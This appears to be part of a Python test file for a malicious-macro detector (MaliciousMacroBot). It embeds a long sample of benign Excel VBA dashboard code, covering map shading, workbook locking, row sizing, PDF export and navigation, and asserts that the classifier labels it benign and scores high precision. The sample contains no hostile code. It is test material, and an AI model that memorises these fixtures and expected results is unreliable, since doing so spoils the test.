Marcus Krackowizer\\n\\\' marcus@artoak.net\\n\\nPrivate Sub ShadeMap()\\n\\nDim shtData As Worksheet\\nDim shtMap As Worksheet\\nDim rData As Range\\nDim Region As Range\\nDim strMapPieceID As String\\nDim lThemeBin As Long\\nDim rThemeColours As Range\\n\\\'Application.ScreenUpdating = False\\n\\nOn Error GoTo EH\\n\\nDim strSheetName As String\\nstrSheetName = ActiveSheet.Name\\n\\nIf strSheetName = "Summary" Then\\nSet shtData = ThisWorkbook.Sheets("iMap_Rank")\\nSet shtMap = ThisWorkbook.Sheets(strSheetName)\\n\\nSet rData = shtData.Range("Q19:Q43")\\nSet rThemeColours = ThisWorkbook.Sheets("uxb_mapdata").Range("L13")\\n\\nElse\\nSet shtData = ThisWorkbook.Sheets("iMap_Region")\\nSet shtMap = ThisWorkbook.Sheets(strSheetName)\\n\\nSet rData = shtData.Range("Q19:Q43")\\nSet rThemeColours = ThisWorkbook.Sheets("uxb_mapdata").Range("L17")\\n\\nEnd If\\n\\n\\\'Set shtMap = ThisWorkbook.Sheets(strSheetName)\\n\\n\\\'Set rData = shtData.Range("Q19:Q43")\\n\\\'Set rThemeColours = ThisWorkbook.Sheets("uxb_mapdata").Range("L13")\\n\\n\\\'Application.ScreenUpdating = False\\n\\n\\\' shtMap.Range("Z2:Z130").Interior.Color = rThemeColours.Offset(0, -2).Interior.Color\\n\\n\\nIf shtData.Range("B6") <> 1 Then\\n    \\\' can\\\'t shade in category headings etc.\\n    naColour = rThemeColours.Offset(0, -1).Interior.Color\\n    \\n    For Each Region In ThisWorkbook.Sheets("uxb_regions").Range("I3:I27")\\n         shtMap.Shapes(Region.Value).Fill.ForeColor.RGB = naColour\\n    Next Region\\n \\\'   \\\'Application.ScreenUpdating = True\\n    Exit Sub\\nEnd If\\n\\n\\nFor Each Region In rData\\n    If Not (IsError(Region.Value)) And Region.Value <> "x" Then\\n        If Region.Value <> "" Then\\n            strMapPieceID = Region.Value\\n            lThemeBin = Region.Offset(0, 2).Value\\n            shtMap.Shapes(strMapPieceID).Fill.ForeColor.RGB = rThemeColours.Offset(0, lThemeBin).Interior.Color\\n        End If\\n    End If\\n    \\nNext Region\\n\\n\\\' shade the data table fifths\\n\\\'For Each Region In shtMap.Range("Z2:Z27")\\n\\\'    If IsNumeric(Region.Offset(0, 4)) Then\\n\\\'        lThemeBin = Region.Offset(0, 4)\\n\\\'    Else\\n\\\'      \'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.Run "AutoHeightWeights"\\n\\\'        Application.Run "WeightsDefaultFB"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.Run "AutoHeightWeights"\\n\\\'        Application.Run "WeightsDefaultFB"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.Run "AutoHeightWeights"\\n\\\'        Application.Run "WeightsDefaultFB"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n            Application.Run "BG_BlankFB"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub AutoHeightWeights()\\nApplication.ScreenUpdating = False\\nApplication.Calculation = xlManual\\nApplication.Run "AA_UnlockWB"\\n\\n    Dim EmptyRow As Range\\n    Dim indi_cat As Integer\\n    Dim crtsheet As String\\n\\ncrtsheet = ActiveSheet.Name\\n\\nFor Each EmptyRow In ThisWorkbook.Sheets(crtsheet).Range("B11:B83").Cells\\n        If EmptyRow.Value = "0" And RowHeight <> 0 Then\\n            EmptyRow.EntireRow.RowHeight = 0\\n        ElseIf EmptyRow.Value <> "0" Then\\n            EmptyRow.EntireRow.RowHeight = 15\\n        Else\\n                EmptyRow.EntireRow.RowHeight = 0\\n        End If\\n    Next\\n\\n\\nApplication.Run "lockWB"\\nApplication.Calculation = xlAutomatic\\nApplication.ScreenUpdating = True\\nEnd Sub\\n\\nSub WeightsDefaultFB()\\n      \\n    Dim iRow As Integer\\n    \\n    Application.Run "AA_UnlockWB"\\n\\n    crtsheet = ActiveSheet.Name\\n    iRow = ThisWorkbook.Sheets(crtsheet).Range("BC1")\\n  \\n    Set rSrc = ThisWorkbook.Sheets("tblWeights").Range("A7:A162").Offset(0, iRow)\\n    Set rTrg = ThisWorkbook.Sheets(crtsheet).Range("G7:G162")\\n    rTrg.Value = rSrc.Value\\n    \\n    Application.Run "lockWB"\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\nApplication.Run "AA_UnlockWB"\\n\\\'Application.run "CornerMenus"\\nApplication.GoTo Reference:=Range("A1"), Scroll:=True\\nApplication.Run "LockWB"\\nEnd Sub\'\n\n\n\n\\\'Contact Marcus Krackowizer with questions\\n\\\'marcus@artoak.net\\n\\nPrivate Sub AutoHeightCompNew()\\nApplication.ScreenUpdating = False\\nApplication.Calculation = xlManual\\nApplication.Run "AA_UnlockWB"\\n\\n    Dim EmptyRow As Range\\n    Dim indi_cat As Integer\\n    Dim crtsheet As String\\n\\ncrtsheet = ActiveSheet.Name\\n\\nFor Each EmptyRow In ThisWorkbook.Sheets(crtsheet).Range("I11:I42").Cells\\n        If EmptyRow.Value = "5" Then\\n            GoTo Jump\\n        ElseIf EmptyRow.Value = "0" And RowHeight <> 0 Then\\n            EmptyRow.EntireRow.RowHeight = 0\\n        ElseIf EmptyRow.Value <> "0" Then\\n            EmptyRow.EntireRow.AutoFit\\n        Else\\n                EmptyRow.EntireRow.RowHeight = 0\\n        End If\\nJump:\\n    Next\\n\\nApplication.Run "lockWB"\\nApplication.Calculation = xlAutomatic\\nApplication.ScreenUpdating = True\\nEnd Sub\\n\\n\\nSub ccautohieght()\\nApplication.ScreenUpdating = False\\n    Application.Run "AA_UnlockWB"\\n        Application.Calculation = xlManual\\n               AutoHeightComp\\n                AutoHeightSpider\\n                LineUpCharts\\n        Application.Calculation = xlAutomatic\\n    Application.Run "lockWB"\\nApplication.ScreenUpdating = True\\nEnd Sub\\n\\nPrivate Sub AutoHeightComp()\\n\\\'Application.ScreenUpdating = False\\n\\\'Application.run "AA_UnlockWB"\\n\\n    Dim EmptyRow As Range\\n    Dim indi_cat As Integer\\n    Dim crtsheet As String\\n\\ncrtsheet = ActiveSheet.Name\\n\\nFor Each EmptyRow In ThisWorkbook.Sheets(crtsheet).Range("C11:C112").Cells\\n        If EmptyRow.Value = "0" And RowHeight <> 0 Then\\n        EmptyRow.EntireRow.RowHeight = 0\\n        ElseIf EmptyRow.Value <> "0" Then\\n        EmptyRow.EntireRow.AutoFit\\n        Else\\n                EmptyRow.EntireRow.RowHeight = 0\\n\\n        End If\\n    Next\\n\\n\\n\\\'Application.run "lockWB"\\n\\\'Application.ScreenUpdating = True\\nEnd Sub\\n\\nPrivate Sub AutoHeightSpider()\\n\\nDim Sheetref As String\\nDim crtsheet As String\\n\\ncrtsheet = ActiveSheet.Name\\n\\nIf crtsheet = "CountryCompareFB" Then\\n\\n    Sheetref = "iCCompSpiderFB"\\n    \\nElseIf crtsheet = "CountryCompare\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\n\\\'Application.Run "AutoHeightCompNew"\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.Run "AutoHeightCompNew"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\n\\\'Application.Run "AutoHeightCompNew"\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.Run "AutoHeightCompNew"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\n\\\'Contact Marcus Krackowizer with questions\\n\\\'marcus@artoak.net\\n\\nPrivate Sub ccautohieghtregion()\\nApplication.ScreenUpdating = False\\n    Application.Run "AA_UnlockWB"\\n        Application.Calculation = xlManual\\n               AutoHeightRegionComp\\n                AutoHeightRegionSpider\\n                LineUpRegionCharts\\n        Application.Calculation = xlAutomatic\\n    Application.Run "lockWB"\\nApplication.ScreenUpdating = True\\nEnd Sub\\n\\nPrivate Sub AutoHeightRegionComp()\\n\\\'Application.ScreenUpdating = False\\n\\\'Application.run "AA_UnlockWB"\\n\\n    Dim EmptyRow As Range\\n    Dim indi_cat As Integer\\n    Dim crtsheet As String\\n\\ncrtsheet = ActiveSheet.Name\\n\\n\\nFor Each EmptyRow In ThisWorkbook.Sheets(crtsheet).Range("C11:C112").Cells\\n        If EmptyRow.Value = "0" And RowHeight <> 0 Then\\n        EmptyRow.EntireRow.RowHeight = 0\\n        ElseIf EmptyRow.Value <> "0" Then\\n        EmptyRow.EntireRow.AutoFit\\n        Else\\n                EmptyRow.EntireRow.RowHeight = 0\\n\\n        End If\\n    Next\\n\\n\\n\\\'Application.run "lockWB"\\n\\\'Application.ScreenUpdating = True\\nEnd Sub\\n\\nPrivate Sub AutoHeightRegionSpider()\\n\\nDim crtsheet As String\\n\\ncrtsheet = ActiveSheet.Name\\n\\nIf crtsheet = "RegionCompareFB" Then\\n\\n    Sheetref = "iCRegionSpiderFB"\\n    \\nElseIf crtsheet = "RegionCompareCG" Then\\n\\n    Sheetref = "iCRegionSpiderCG"\\n\\nElseIf crtsheet = "RegionCompareHS" Then\\n\\n    Sheetref = "iCRegionSpiderHS"\\n\\nElse: crtsheet = "RegionCompareHT"\\n\\n    Sheetref = "iCRegionSpiderHT"\\n\\nEnd If\\n\\nFor Each EmptyRow In ThisWorkbook.Sheets(Sheetref).Range("C115:C119").Cells\\n        If EmptyRow.Value = "0" Then\\n        EmptyRow.EntireRow.RowHeight = 0\\n        Else\\n        EmptyRow.EntireRow.AutoFit\\n        End If\\n    Next\\nEnd Sub\\n\\n\\nPrivate Sub LineUpRegionCharts()\\n\\n         Dim myWidth As Single, MyHeight As Single\\n         Dim NumWide As Long\\n         Dim iChtIx As Long, iChtCt As Long\\n\\n         myWidth = 475\\n         MyHeight = 550\\n         NumWide = 3\\n\\n         iChtCt = ActiveSheet.ChartObjects.Count\\n         For iChtIx = 1 To \'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n            Application.Run "BG_BlankCG"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\n\\\'Application.Run "AutoHeightCompNew"\\n\\nVersion = Get_Value("MODE")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n          Application.Run "AutoHeightCompNew"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\n\\\'Application.Run "AutoHeightCompNew"\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.Run "AutoHeightCompNew"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\n\\\'Application.Run "AutoHeightCompNew"\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.Run "AutoHeightCompNew"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n                    Application.Run "BG_BlankHS"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.Run "Shade_filter"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\n\\\'Application.Run "AutoHeightCompNew"\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.Run "AutoHeightCompNew"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\n\\\'Application.Run "AutoHeightCompNew"\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.Run "AutoHeightCompNew"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\n\\\' Export code\\n\\\' i.e. PDF and XLS\\n\\\' possibly a full data dump?\\nPublic Const wbGUID = "EXPORT GUID: 234-112-116-0000"\\n\\n\\n\\nPrivate Sub Generate_PDF()\\n\\\' Default filename could include the Section and Page Name (plus date/time?)\\nDim strOS As String\\nDim strInitialFilename As String\\nDim strFilename\\nDim strError1 As String\\nDim strError2 As String\\n\\n\\\'On Error GoTo quit\\nstrError1 = "Sorry.  PDF export is only available on Excel 2007 or later running on a Windows PC"\\nstrError2 = "PDF document was not saved.  Ensure a pdf document with this name is not already open."\\n\\nstrOS = Application.OperatingSystem\\nIf InStr(1, strOS, "Windows") = 0 Or Application.Version < 12 Then\\n     MsgBox strError1\\n     Exit Sub\\nEnd If\\n\\nstrInitialFilename = "Global-Resource-Management-Index" & ActiveSheet.Name & Format(Now(), "ddmmyyhhmmss") & ".pdf"\\nstrFilename = Application.GetSaveAsFilename(filefilter:="PDF Files (*.pdf), *.pdf", InitialFileName:=strInitialFilename)\\n\\nIf strFilename <> False Then\\n    Application.Run "AA_UnlockWB"\\n    PDF_Adjustment ActiveSheet, False\\n    On Error GoTo exportfail\\n    ActiveSheet.ExportAsFixedFormat Type:=xlTypePDF, Filename:=strFilename, Quality:=xlQualityStandard, IncludeDocProperties:=False, IgnorePrintAreas:=False, OpenAfterPublish:=True\\n    PDF_Adjustment ActiveSheet, True\\n    ActiveSheet.DisplayPageBreaks = False\\n    Application.Run "lockWB"\\nEnd If\\n\\nExit Sub\\n\\nexportfail:\\n    PDF_Adjustment ActiveSheet, True\\n    ActiveSheet.DisplayPageBreaks = False\\n    Application.Run "LockWB"\\n    MsgBox strError2\\nquit:\\nEnd Sub\\n\\nPrivate Sub PDF_Adjustment(sht As Worksheet, bRestore As Boolean)\\nDim lVal As Long\\n\\n\\\' default\\nsht.PageSetup.FitToPagesWide = 1\\nsht.PageSetup.FitToPagesTall = 1\\n             \\n             End Sub\\n             \\n            \\nPrivate Sub Generate_XL()\\nDim wbTrg As Workbook\\nDim wbSrc As Workbook\\nDim shtSrc As Worksheet\\nDim shtTrg As Worksheet\\nDim lSheetsInNew As Long\\nDim bFound As Boolean\\n\\nbFound = False\\n\\n\\nlSheetsInNew = Application.SheetsInNewWorkbook\\n\\n\\\' TODO\\n\\\'\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n                Application.Run "Shade_filter"\\n        ThisWorkbook.Sheets("uxb_works").Range("B85") = 2\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub rezize()\\n\\nFor Each EmptyRow In ThisWorkbook.Sheets("iIndiSummary").Range("J34:J35").Cells\\n        If EmptyRow.Value = "0" Then\\n        EmptyRow.EntireRow.RowHeight = 0\\n        Else\\n        EmptyRow.EntireRow.AutoFit\\n        End If\\n    Next\\nEnd Sub\\n\\n Sub SummaryFilter()\\n\\nApplication.Run "AA_UnlockWB"\\n    Application.Calculation = xlCalculationManual\\n        Application.ScreenUpdating = False\\n\\n\\nFor Each EmptyRow In ThisWorkbook.Sheets("SummaryC").Range("B9:B33").Cells\\n        If EmptyRow.Value = "0" Then\\n        EmptyRow.EntireRow.RowHeight = 0\\n        Else\\n        EmptyRow.EntireRow.RowHeight = 15\\n        End If\\n    Next\\n    \\n        Application.ScreenUpdating = True\\n    Application.Calculation = xlCalculationAutomatic\\nApplication.Run "lockWB"\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\n\\\'Application.Run "AutoHeightCompNew"\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.Run "AutoHeightCompNew"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nOption Explicit\\n\\nPublic Const strGlobalsSheet = "uxb_works"\\nPublic Const str_sht_Nav_History = "tblNavHist"\\nPublic Const str_sht_Home = "Home"\'\n\n\n\nPublic Sub Navigate(lSectionID As Long, lPageID As Long, Optional bBack As Boolean = False)\\nDim l As Long\\nDim aPages\\nDim strSheets As String\\n\\nstrSheets = Get_Value("SHEET_SET_" & CStr(lSectionID))\\naPages = Split(strSheets, ",")\\n\\n\\\' hide all the sheets\\n\\\'If Get_Value("MODE") <> "DEV" Then\\n\\\'    For l = 0 To UBound(aPages) - 1\\n\\\'        ThisWorkbook.Sheets(aPages(l)).Visible = False\\n\\\'    Next l\\n\\\'End If\\n\\n\\\' show the active sheet\\n    \\n    ThisWorkbook.Sheets(aPages(lPageID)).Visible = True\\n    ThisWorkbook.Sheets(aPages(lPageID)).Activate\\n    ActiveSheet.DisplayPageBreaks = False\\n\\n    ActiveWindow.ScrollColumn = 1\\n    ActiveWindow.ScrollRow = 1\\n    ActiveSheet.Range("A2").Select\\n\\nIf Not bBack Then   \\\' don\\\'t update history if this is a "back" call\\n    Navigate_Add_To_History lSectionID, lPageID\\nEnd If\\n\\nEnd Sub\\n\\nPublic Sub Navigate_Add_To_History(lSectionID, lPageID)\\nDim shtHistory As Worksheet\\nDim lHistoryID As Long\\nDim r As Range\\n\\n    Set shtHistory = ThisWorkbook.Sheets(str_sht_Nav_History)\\n    \\n    lHistoryID = Get_Value("nav_historyID")\\n    If lHistoryID < 2 Then lHistoryID = 2\\n    \\n    \\\' avoid crash if history gets too long\\n    If lHistoryID >= 120000 Then lHistoryID = 50000\\n    \\n    shtHistory.Cells(lHistoryID, 1).Value = lSectionID\\n    shtHistory.Cells(lHistoryID, 2).Value = lPageID\\n    \\n    \\\' get any globals marked for save\\n    Set r = shtHistory.Range("D1")\\n    While r.Value <> ""\\n        shtHistory.Cells(lHistoryID, r.Column).Value = Get_Value(r.Value)\\n        Set r = r.Offset(0, 1)\\n    Wend\\n        \\n        \\\' move the history counter on\\n        Set_Value "nav_historyID", lHistoryID + 1\\n        \\nEnd Sub\\n\\n\\n\\nPublic Sub Navigate_ClearHistory()\\nSet_Value "nav_historyID", 2\\nThisWorkbook.Sheets(str_sht_Nav_History).Range("A2:Z100000").ClearContents\\nEnd Sub\\n\\nPrivate Sub Navigate_GoBack()\\nDim lHistoryID As Long\\nDim shtHistory As Worksheet\\nDim strGlobal As String\\nDim r As Range\\nDim strValue\\n\\n\\\'Application.Run "AA_UnlockWB"\\n\\\'Application.Calculation = xlCalculationManual\\nApplic\''
    mmbot = MaliciousMacroBot()
    mmbot.mmb_init_model()
    mmb_result = mmbot.mmb_predict(vba_code, datatype='vba')
    mmb_json = mmbot.mmb_prediction_to_json(mmb_result)[0]
    assert(mmb_json['prediction'] == "benign")


def test_mmb_model_evaluation():
    results = mmbot.mmb_evaluate_model()
    print(results)
    assert(results['precision'].mean() > .9)
